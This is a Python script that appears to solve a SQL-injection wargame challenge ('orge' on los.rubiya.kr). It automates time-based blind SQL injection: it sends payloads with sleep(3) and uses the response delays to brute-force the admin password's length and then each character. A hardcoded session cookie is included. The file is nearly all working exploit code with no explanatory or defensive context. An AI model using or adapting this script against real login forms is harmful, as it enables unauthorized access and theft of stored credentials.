import requests
import time
import warnings

warnings.filterwarnings("ignore")

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'

#aaa' union select sleep(3) or '1' = '1

# params = {'pw': 'aaa\' union select sleep(3) or \'1\' = \'1'}
flag = False
PwLen = 0

while(not flag):
	PwLen += 1
	#aaa'||id='admin
	params = {'pw': 'aaa\'||id=\'admin\' && length(pw)='+str(PwLen)+' && sleep(3)#'}
	cookies = {'PHPSESSID': 'm3gafe2kqcs0l26nspcqvkb9cm'}
	firstTime = time.time()
	res = requests.get(url, params=params , cookies=cookies)
	#print(res.status_code)
	#print(res.text)
	Time = time.time() - firstTime
	#print(Time)
	flag = Time > 3.0

print(PwLen)
cursor = 0
Password = ''
for cursor in range(1,PwLen+1):
	pw = 0 # 33~126
	flag = False
	while(not flag):
		if(pw >= 127):
			print('err!!')
			break
		params = {'pw': '\' || id = \'admin\' && ascii(substr(pw,'+str(cursor)+',1))='+str(pw)+' && sleep(3)#'}
		cookies = {'PHPSESSID': 'm3gafe2kqcs0l26nspcqvkb9cm'}
		firstTime = time.time()
		res = requests.get(url, params=params , cookies=cookies)
		#print(res.status_code)
		#print(res.text)
		Time = time.time() - firstTime
		#print(Time)
		flag = Time > 3.0
		if(flag):
			Password += chr(pw)
		pw += 1
		print(Password)